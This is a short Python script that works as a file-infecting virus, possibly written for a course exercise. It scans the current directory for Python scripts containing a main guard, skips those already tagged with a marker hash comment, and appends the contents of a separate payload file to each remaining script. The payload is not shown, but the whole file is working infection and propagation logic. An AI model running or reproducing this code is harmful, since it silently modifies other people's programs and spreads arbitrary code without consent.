import os
pwd_directory_list = os.listdir()


def is_infected(target_file):
    id = "# 56858c6a52df13e2ae9f3a7cd02bc623c4b42d3670960249a6d50ebe4c5b9d7e"
    with open(target_file, "r") as file:
        for row in file:
            if row.strip() == id:
                return True
    return False

def is_script(script):
    required_statement = 'if __name__ == "__main__":'
    with open(script, 'r') as file:
        for row in file:
            if row.strip() == required_statement:
                return True
    return False

def verify(target_file):
    required_statement = 'if __name__ == "__main__":'
    code = None
    
    if not is_script(target_file):
        return 0
    if is_infected(target_file):
        return 0

    return 1

def inject(target_file, payload_file):
    with open(target_file, 'a+') as target_file, open(payload_file, 'r') as payload_file:
        target_file.write("\n")
        target_file.write(payload_file.read())

for filename in pwd_directory_list:
    if verify(filename): inject(filename, "Q1C_payload.py")
    
        